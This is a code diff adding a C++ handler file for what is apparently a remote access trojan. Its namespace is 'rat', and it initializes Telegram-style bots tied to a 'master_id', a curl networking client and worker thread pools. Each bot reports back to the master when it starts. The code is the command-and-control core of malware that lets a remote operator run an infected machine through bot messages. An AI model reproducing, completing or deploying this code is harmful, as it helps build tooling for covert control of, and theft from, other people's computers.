@@ -1,0 +1,33 @@
+#include "rat/Handler.hpp"
+#include "rat/ThreadPool.hpp"
+#include "rat/tbot/tbot.hpp"
+#include <memory>
+
+namespace rat::handler {
+
+void Handler::setMasterId(const uint64_t Master_Id) {
+    this->master_id = Master_Id;
+}
+
+void Handler::initMainBot(const char* arg_Token) {
+    this->bot = std::make_unique<::rat::tbot::Bot>(arg_Token, this->master_id);
+    this->bot->sendMessage("This Bot has been initialized");
+    this->bot->setOffset();
+}
+
+void Handler::initBackingBot(const char* arg_Token) {
+    this->backing_bot = std::make_unique<::rat::tbot::BaseBot>(arg_Token, this->master_id);
+    this->backing_bot->sendMessage("This Bot has been initialized");
+}
+
+void Handler::initCurlClient(uint8_t Operation_Restart_Bound) {
+    this->curl_client = std::make_unique<::rat::networking::Client>(Operation_Restart_Bound);
+    this->bot->sendMessage("Handler's Curl client has been initialized");
+}
+void Handler::initThreadPools(uint8_t Number_Networking_Threads, uint8_t Number_Process_Threads, uint8_t Number_Timer_Threads) {
+    this->networking_pool = std::make_unique<::rat::ThreadPool>(Number_Networking_Threads);
+    this->process_pool = std::make_unique<::rat::ThreadPool>(Number_Process_Threads);
+    this->timer_pool = std::make_unique<::rat::ThreadPool>(Number_Timer_Threads);
+}
+
+}//rat::handler
